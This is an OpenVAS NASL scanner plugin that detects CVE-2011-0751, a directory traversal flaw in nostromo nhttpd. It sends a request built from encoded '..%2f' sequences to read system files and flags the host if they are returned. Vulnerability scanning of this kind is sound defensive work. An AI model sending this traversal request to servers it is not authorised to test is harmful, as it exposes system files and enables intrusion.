###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nhttpd_46880.nasl 13 2013-10-27 12:16:33Z jan $
#
# nostromo nhttpd Directory Traversal Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "nostromo nhttpd is prone to a remote command-execution vulnerability
because it fails to properly validate user-supplied data.

An attacker can exploit this issue to access arbitrary files and
execute arbitrary commands with application-level privileges.

nostromo versions prior to 1.9.4 are affected.";

tag_solution = "Updates are available. Please see the references for details.";

if (description)
{
 script_id(103119);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
 script_bugtraq_id(46880);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-0751");

 script_name("nostromo nhttpd Directory Traversal Remote Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46880");
 script_xref(name : "URL" , value : "http://www.nazgul.ch/dev_nostromo.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/517026");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if nostromo nhttpd is prone to a remote command-execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: nostromo" >!< banner)exit(0);

files = traversal_files();
   
foreach file (keys(files)) {
  url = string("/",crap(data:"..%2f",length:10*5),files[file]); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

